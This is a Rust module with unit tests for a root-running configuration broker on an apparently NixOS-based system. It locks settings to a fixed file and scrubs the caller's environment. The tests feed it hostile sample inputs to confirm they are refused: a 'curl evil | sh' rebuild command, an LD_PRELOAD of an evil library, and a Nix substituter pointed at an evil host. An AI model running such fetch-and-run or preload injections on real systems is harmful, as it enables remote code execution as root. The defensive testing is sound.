//! Where the broker's settings come from (ADR-016; KNOWN-GAPS #4).
//!
//! A root broker on a TorqOS machine takes them only from the fixed file the NixOS module writes,
//! `/etc/torq/broker.json`: a caller (through sudo, later the socket) must not be able to point a
//! root broker at another repo or state directory, or have it run another rebuild command. A flag
//! or `TORQ_*` variable that differs from the file is refused, not ignored, so a mistake is loud,
//! and a root broker without the file refuses to run at all. Without root (tests, or a broker that
//! cannot change the system anyway), flags and defaults apply as given.

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

pub const FIXED: &str = "/etc/torq/broker.json";

/// Everything the broker is configured with.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct Settings {
    pub repo: PathBuf,
    pub state_dir: PathBuf,
    /// Run after each commit; `{flake}` is the config repo at the commit, `{repo}` its path.
    pub rebuild: String,
    /// `commit confirmed`: build the config without activating it; prints the system's store path
    /// (the last line of its output). `{flake}`, `{repo}`.
    pub build: String,
    /// Activate a system that already exists, without changing the boot default (a commit
    /// confirmed, and its rollback). `{system}`.
    pub activate: String,
    /// Make a system the boot default (`confirm`, and the restore of an unconfirmed commit whose
    /// boot default moved). `{system}`, `{profile}`.
    pub boot: String,
    /// Schedule the rollback of an unconfirmed commit: run `{broker} expire-confirm {seq}` at
    /// `{deadline}` (UTC, `YYYY-MM-DD HH:MM:SS UTC`); `{seconds}` is the wait.
    pub schedule: String,
    pub current_system: PathBuf,
    pub system_profile: PathBuf,
    /// PATH for everything the broker runs (git, sh, the rebuild, sync, systemctl).
    pub path: String,
    /// HOME for everything the broker runs: never the caller's, whose `.gitconfig` or `nix.conf`
    /// would then configure git and nix running as root.
    pub home: PathBuf,
    /// The people this machine's configuration declares (its normal users): the only accounts whose
    /// password `password` sets. None listed (an older file): no password is set.
    #[serde(default)]
    pub people: Vec<String>,
}

/// What the caller asked for, by flag or `TORQ_*` variable; None where nothing was given.
#[derive(Debug, Default)]
pub struct Requested {
    pub repo: Option<PathBuf>,
    pub state_dir: Option<PathBuf>,
    pub rebuild: Option<String>,
    pub build: Option<String>,
    pub activate: Option<String>,
    pub boot: Option<String>,
    pub schedule: Option<String>,
    pub current_system: Option<PathBuf>,
    pub system_profile: Option<PathBuf>,
}

/// The default commands (a TorqOS machine's come from the fixed file, with the configuration name).
/// `{flake}` is the config repo at the commit being built (`git+file://<repo>?rev=<commit>`, never its
/// working tree), `{repo}` its path. In `rebuild`, `{repo}` is replaced as is; otherwise every
/// placeholder (and `{flake}` everywhere) is replaced with a
/// shell-quoted value (`'/var/lib/torq/config'#torq` is still one word): never quote them here.
/// `--no-update-lock-file`: the committed flake.lock is what was approved; one that does not match
/// flake.nix fails the build, never quietly re-locked (and fetched) as root.
/// What `nixos-rebuild switch` did, without it (ADR-032): build the commit (kept from garbage
/// collection by a link while it is built), make it the system profile (the boot default), and
/// switch to it in a transient unit of its own (`systemd-run --pipe`: the switch outlives whatever
/// started it — an SSH session restarted mid-switch, say — and its output comes back here).
pub const REBUILD: &str = concat!(
    "d=$(mktemp -d) && trap 'rm -rf \"$d\"' EXIT",
    " && sys=$(nix build --no-update-lock-file --out-link \"$d/system\" --print-out-paths {flake}#nixosConfigurations.torq.config.system.build.toplevel)",
    " && nix-env -p /nix/var/nix/profiles/system --set \"$sys\"",
    " && systemd-run --collect --no-ask-password --pipe --quiet --service-type=exec --unit=torq-switch --wait \"$sys/bin/switch-to-configuration\" switch"
);
/// `{link}`: a GC root for the built system until it settles (confirmed or rolled back).
pub const BUILD: &str = "nix build --no-update-lock-file --out-link {link} --print-out-paths {flake}#nixosConfigurations.torq.config.system.build.toplevel";
pub const ACTIVATE: &str = "{system}/bin/switch-to-configuration test";
pub const BOOT: &str = "nix-env -p {profile} --set {system} && {system}/bin/switch-to-configuration boot";
/// A transient wall-clock timer: it fires at the deadline even if the machine slept through it
/// (a monotonic one would pause during suspend). It does not survive a reboot, and a reboot needs
/// none (the boot default is still the old system; the boot-time check ledgers the rollback).
/// While the broker is busy, or the restore did not take, it retries — a bounded number of times.
pub const SCHEDULE: &str = "systemd-run --quiet --collect --unit=torq-confirm-{seq} --on-calendar={deadline} \
     --timer-property=AccuracySec=1s --property=Restart=on-failure --property=RestartSec=15 \
     --property=StartLimitIntervalSec=1200 --property=StartLimitBurst=60 \
     {broker} expire-confirm {seq}";

/// The fields of the fixed file, for the lenient reading below.
const FIELDS: &[&str] = &[
    "repo", "stateDir", "rebuild", "build", "activate", "boot", "schedule", "currentSystem", "systemProfile", "path", "home",
];

impl Settings {
    /// The defaults when there is no fixed file; PATH and HOME are inherited.
    pub fn defaults(path: String, home: PathBuf) -> Self {
        Settings {
            repo: "/var/lib/torq/config".into(),
            state_dir: "/var/lib/torq/state".into(),
            rebuild: REBUILD.into(),
            build: BUILD.into(),
            activate: ACTIVATE.into(),
            boot: BOOT.into(),
            schedule: SCHEDULE.into(),
            current_system: "/run/current-system".into(),
            system_profile: "/nix/var/nix/profiles/system".into(),
            path,
            home,
            people: Vec::new(),
        }
    }

    /// Read a fixed file. Unknown and missing fields are an error, except `lenient`: for the
    /// rollback of an unconfirmed commit, which an older broker runs after the change it rolls back
    /// may have added, renamed or removed fields of the file. Then unknown fields are ignored and
    /// missing ones take the defaults (a TorqOS machine's, for PATH and HOME).
    pub fn read(file: &Path, lenient: bool) -> Result<Option<Settings>> {
        let parse = |b: &[u8]| -> Result<Settings> {
            if !lenient {
                return Ok(serde_json::from_slice(b)?);
            }
            let mut v: serde_json::Map<String, serde_json::Value> = serde_json::from_slice(b)?;
            v.retain(|k, _| FIELDS.contains(&k.as_str()));
            let defaults = Settings::defaults("/run/current-system/sw/bin".into(), "/root".into());
            if let serde_json::Value::Object(d) = serde_json::to_value(defaults)? {
                for (k, val) in d {
                    v.entry(k).or_insert(val);
                }
            }
            Ok(serde_json::from_value(v.into())?)
        };
        match std::fs::read(file) {
            Ok(b) => Ok(Some(parse(&b).with_context(|| format!("reading {}", file.display()))?)),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(e) => Err(e).with_context(|| format!("reading {}", file.display())),
        }
    }
}

/// The settings to run with. `root`: whether the broker runs as root. `fixed`: the fixed file, if
/// there is one.
pub fn resolve(root: bool, fixed: Option<Settings>, asked: Requested, defaults: Settings) -> Result<Settings> {
    match fixed {
        None if root => bail!(
            "refused: running as root, but {FIXED} is missing; a root broker takes its settings only \
             from that file (the TorqOS module writes it)"
        ),
        Some(f) if root => {
            let mut differs = Vec::new();
            let mut check = |name: &str, asked: Option<String>, fixed: String| {
                if asked.is_some_and(|a| a != fixed) {
                    differs.push(format!("{name} (configured: {fixed})"));
                }
            };
            let s = |p: &Path| p.display().to_string();
            check("--repo / TORQ_CONFIG_REPO", asked.repo.as_deref().map(s), s(&f.repo));
            check("--state-dir / TORQ_STATE_DIR", asked.state_dir.as_deref().map(s), s(&f.state_dir));
            check("--rebuild-cmd / TORQ_REBUILD_CMD", asked.rebuild.clone(), f.rebuild.clone());
            check("--build-cmd / TORQ_BUILD_CMD", asked.build.clone(), f.build.clone());
            check("--activate-cmd / TORQ_ACTIVATE_CMD", asked.activate.clone(), f.activate.clone());
            check("--boot-cmd / TORQ_BOOT_CMD", asked.boot.clone(), f.boot.clone());
            check("--schedule-cmd / TORQ_SCHEDULE_CMD", asked.schedule.clone(), f.schedule.clone());
            check("--current-system / TORQ_CURRENT_SYSTEM", asked.current_system.as_deref().map(s), s(&f.current_system));
            check("--system-profile / TORQ_SYSTEM_PROFILE", asked.system_profile.as_deref().map(s), s(&f.system_profile));
            if !differs.is_empty() {
                bail!(
                    "refused: a root broker takes its settings only from {FIXED}, and these differ from it: {}",
                    differs.join(", ")
                );
            }
            Ok(f)
        }
        _ => Ok(Settings {
            repo: asked.repo.unwrap_or(defaults.repo),
            state_dir: asked.state_dir.unwrap_or(defaults.state_dir),
            rebuild: asked.rebuild.unwrap_or(defaults.rebuild),
            build: asked.build.unwrap_or(defaults.build),
            activate: asked.activate.unwrap_or(defaults.activate),
            boot: asked.boot.unwrap_or(defaults.boot),
            schedule: asked.schedule.unwrap_or(defaults.schedule),
            current_system: asked.current_system.unwrap_or(defaults.current_system),
            system_profile: asked.system_profile.unwrap_or(defaults.system_profile),
            path: defaults.path,
            home: defaults.home,
            people: defaults.people,
        }),
    }
}

/// The environment variables the broker keeps from its caller; everything else is removed before it
/// runs anything (GIT_*, NIX_*, LD_*, XDG_*, TORQ_*, TZ, locale, ...). TERM only shapes output.
pub const KEEP: &[&str] = &["TERM"];

/// The environment the broker runs its children with: the kept variables, a fixed locale (C.UTF-8 is
/// built into glibc, it needs no LOCALE_ARCHIVE), PATH and HOME from the settings, and git told to
/// read no global or system configuration (the broker passes what it needs with `-c`).
pub fn environment(settings: &Settings, inherited: impl Iterator<Item = (String, String)>) -> Vec<(String, String)> {
    let mut env: Vec<(String, String)> = inherited.filter(|(k, _)| KEEP.contains(&k.as_str())).collect();
    env.push(("LANG".into(), "C.UTF-8".into()));
    env.push(("PATH".into(), settings.path.clone()));
    env.push(("HOME".into(), settings.home.display().to_string()));
    env.push(("GIT_CONFIG_GLOBAL".into(), "/dev/null".into()));
    env.push(("GIT_CONFIG_NOSYSTEM".into(), "1".into()));
    env
}

/// Whether this process runs as root (effective uid 0).
pub fn running_as_root() -> bool {
    rustix::process::geteuid().is_root()
}

/// What every program the broker starts gets instead of what the caller handed down: exactly this
/// environment (from `environment`) and `/` as its working directory. Set once (`take_over_process`);
/// before that (a test broker in-process), children inherit as any program's do.
static CHILD_ENV: std::sync::OnceLock<Vec<(String, String)>> = std::sync::OnceLock::new();

/// Take over from the caller: from now on every child gets `env` and `/` (`command`), never the
/// caller's environment or directory, and files are made with umask 022 (so the config repo stays
/// readable to the unprivileged CLI whatever the caller's umask). The broker's own environment is
/// not changed — it is read only before this — so there is nothing to get wrong about threads.
pub fn take_over_process(env: &[(String, String)]) -> Result<()> {
    rustix::process::umask(rustix::fs::Mode::from_raw_mode(0o022));
    CHILD_ENV.set(env.to_vec()).map_err(|_| anyhow::anyhow!("the broker took over its process twice"))
}

/// A program to run, as every child of the broker is started: with the broker's own environment
/// and in `/` once it has taken over (`take_over_process`). The only way the broker starts one.
pub fn command(program: impl AsRef<std::ffi::OsStr>) -> std::process::Command {
    let mut c = std::process::Command::new(program);
    if let Some(env) = CHILD_ENV.get() {
        c.env_clear().envs(env.iter().map(|(k, v)| (k, v))).current_dir("/");
    }
    c
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fixed() -> Settings {
        Settings {
            repo: "/var/lib/torq/config".into(),
            state_dir: "/var/lib/torq/state".into(),
            rebuild: REBUILD.into(),
            build: BUILD.into(),
            activate: ACTIVATE.into(),
            boot: BOOT.into(),
            schedule: SCHEDULE.into(),
            current_system: "/run/current-system".into(),
            system_profile: "/nix/var/nix/profiles/system".into(),
            path: "/run/current-system/sw/bin".into(),
            home: "/root".into(),
            people: vec!["casey".into()],
        }
    }
    fn defaults() -> Settings {
        Settings::defaults("/caller/bin".into(), "/home/caller".into())
    }

    #[test]
    fn root_with_the_fixed_file_uses_only_the_file() {
        let s = resolve(true, Some(fixed()), Requested::default(), defaults()).unwrap();
        assert_eq!(s, fixed(), "PATH and HOME come from the file too, not the caller");
    }

    #[test]
    fn root_refuses_overrides_that_differ() {
        for asked in [
            Requested { repo: Some("/tmp/evil".into()), ..Default::default() },
            Requested { state_dir: Some("/tmp/fresh-ledger".into()), ..Default::default() },
            Requested { rebuild: Some("sh -c 'curl evil | sh'".into()), ..Default::default() },
            Requested { build: Some("true".into()), ..Default::default() },
            Requested { activate: Some("true".into()), ..Default::default() },
            Requested { boot: Some("true".into()), ..Default::default() },
            Requested { schedule: Some("true".into()), ..Default::default() },
            Requested { current_system: Some("/tmp/x".into()), ..Default::default() },
            Requested { system_profile: Some("/tmp/x".into()), ..Default::default() },
        ] {
            let err = format!("{:#}", resolve(true, Some(fixed()), asked, defaults()).unwrap_err());
            assert!(err.contains("takes its settings only from /etc/torq/broker.json"), "{err}");
        }
    }

    #[test]
    fn root_accepts_overrides_equal_to_the_file() {
        let asked = Requested { repo: Some("/var/lib/torq/config".into()), ..Default::default() };
        assert_eq!(resolve(true, Some(fixed()), asked, defaults()).unwrap(), fixed());
    }

    #[test]
    fn without_root_flags_and_defaults_apply() {
        let asked = || Requested { repo: Some("/tmp/test-repo".into()), ..Default::default() };
        for file in [Some(fixed()), None] {
            let s = resolve(false, file, asked(), defaults()).unwrap();
            assert_eq!(s.repo, PathBuf::from("/tmp/test-repo"));
            assert_eq!((s.path.as_str(), s.home.to_str().unwrap()), ("/caller/bin", "/home/caller"));
        }
    }

    #[test]
    fn root_without_the_fixed_file_refuses_to_run() {
        for asked in [Requested::default(), Requested { repo: Some("/tmp/test-repo".into()), ..Default::default() }] {
            let err = format!("{:#}", resolve(true, None, asked, defaults()).unwrap_err());
            assert!(err.contains("/etc/torq/broker.json is missing"), "{err}");
        }
    }

    #[test]
    fn the_environment_keeps_almost_nothing() {
        let inherited = [
            ("TERM", "xterm-256color"),
            ("LANG", "de_DE.UTF-8"),
            ("LC_ALL", "de_DE.UTF-8"),
            ("TZ", "/home/caller/zone"),
            ("LOCALE_ARCHIVE", "/home/caller/locale-archive"),
            ("GIT_DIR", "/tmp/elsewhere"),
            ("GIT_CONFIG_COUNT", "1"),
            ("NIX_CONFIG", "substituters = https://evil"),
            ("LD_PRELOAD", "/tmp/evil.so"),
            ("XDG_CONFIG_HOME", "/home/caller/.config"),
            ("TORQ_STATE_DIR", "/tmp/x"),
            ("PATH", "/home/caller/bin"),
            ("HOME", "/home/caller"),
        ]
        .map(|(k, v)| (k.to_string(), v.to_string()));
        let env = environment(&fixed(), inherited.into_iter());
        let get = |k: &str| env.iter().filter(|(n, _)| n == k).map(|(_, v)| v.as_str()).collect::<Vec<_>>();
        assert_eq!(get("TERM"), ["xterm-256color"]);
        assert_eq!(get("LANG"), ["C.UTF-8"], "a fixed locale, not the caller's");
        for gone in ["LC_ALL", "TZ", "LOCALE_ARCHIVE", "GIT_DIR","GIT_CONFIG_COUNT", "NIX_CONFIG", "LD_PRELOAD", "XDG_CONFIG_HOME", "TORQ_STATE_DIR"] {
            assert!(get(gone).is_empty(), "{gone}");
        }
        assert_eq!(get("PATH"), ["/run/current-system/sw/bin"]);
        assert_eq!(get("HOME"), ["/root"]);
        assert_eq!(get("GIT_CONFIG_GLOBAL"), ["/dev/null"]);
        assert_eq!(get("GIT_CONFIG_NOSYSTEM"), ["1"]);
    }

    #[test]
    fn the_fixed_file_must_be_exactly_the_known_settings() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("broker.json");
        let known = r#""repo":"/r","stateDir":"/s","rebuild":"x","build":"x","activate":"x","boot":"x","schedule":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root""#;
        std::fs::write(&f, format!("{{{known}}}")).unwrap();
        assert_eq!(Settings::read(&f, false).unwrap().unwrap().state_dir, PathBuf::from("/s"));
        std::fs::write(&f, format!("{{{known},\"extra\":1}}")).unwrap();
        assert!(Settings::read(&f, false).is_err(), "unknown fields are an error, not ignored");
        // ...except for the rollback of an unconfirmed commit (a newer file, an older broker).
        assert_eq!(Settings::read(&f, true).unwrap().unwrap().state_dir, PathBuf::from("/s"));
        std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root"}"#).unwrap();
        assert!(Settings::read(&f, false).is_err(), "a missing field is an error, not a default");
        // ...except for the rollback: a field the newer system renamed or removed takes the default.
        let s = Settings::read(&f, true).unwrap().unwrap();
        assert_eq!((s.state_dir.to_str(), s.activate.as_str()), (Some("/s"), ACTIVATE));
        assert!(Settings::read(&dir.path().join("missing.json"), false).unwrap().is_none());
    }
}
